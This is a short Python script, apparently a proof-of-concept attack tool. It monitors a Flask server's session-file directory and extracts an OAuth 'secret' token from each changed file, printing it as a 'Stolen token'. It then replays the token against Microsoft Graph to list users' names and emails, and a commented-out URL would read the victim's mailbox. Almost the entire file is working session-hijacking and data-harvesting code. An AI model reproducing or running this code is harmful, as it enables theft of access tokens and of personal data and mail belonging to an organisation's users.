import time
import re
import requests
import codecs
import json
from watchdog.observers import Observer
from watchdog.events import PatternMatchingEventHandler

def on_modified(event):
    pattern = '^.*/[a-z0-9]{32}$'
    result = re.match(pattern, event.src_path)
    if ( result ) :
        sessionfile = open(event.src_path, 'r', encoding='utf-8', errors='ignore')
        data = sessionfile.read()
        m = re.search(r'\"secret\": "(.*)",', data)
        if ( m is None ) :
            sessionfile.close()
        else :
            print(f"---------------------------------------------------------")
            print(f"Getting user token from {event.src_path} session files...")
            print(f"")
            token = m.group(1)
            print(f"Stolen token: ", format(token))
            print(f"")
            print(f"Grabbing users personal information (name/email) from the cloud...")
            # SCOPE ==> User.ReadBasic.All
            # read basic info of the users in organization
            URL = 'https://graph.microsoft.com/v1.0/users?$select=displayName,mail'
            # SCOPE ==> Mail.Read
            # read messages in user mailbox
            # URL = 'https://graph.microsoft.com/v1.0/me/messages'
            headers = {
                "Authorization": "Bearer {}".format(token),
                "Accept": "application/json"
            }
            # TODO: fare funzione per get, parsare il file con info e richiamare nuova funzione se c'e next page
            s = requests.Session()
            r = s.get(URL, headers=headers)
            print(r.text)
            print(f"")
            sessionfile.close()
            print(f"---------------------------------------------------------")
            print(f"")

if __name__ == "__main__":
    patterns = "*"
    ignore_patterns = ""
    ignore_directories = True
    case_sensitive = True
    my_event_handler = PatternMatchingEventHandler(patterns, ignore_patterns, ignore_directories, case_sensitive)
    my_event_handler.on_modified = on_modified

    path = "./flask_session"
    go_recursively = False
    my_observer = Observer()
    my_observer.schedule(my_event_handler, path, recursive=go_recursively)

    my_observer.start()
    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        my_observer.stop()
        my_observer.join()

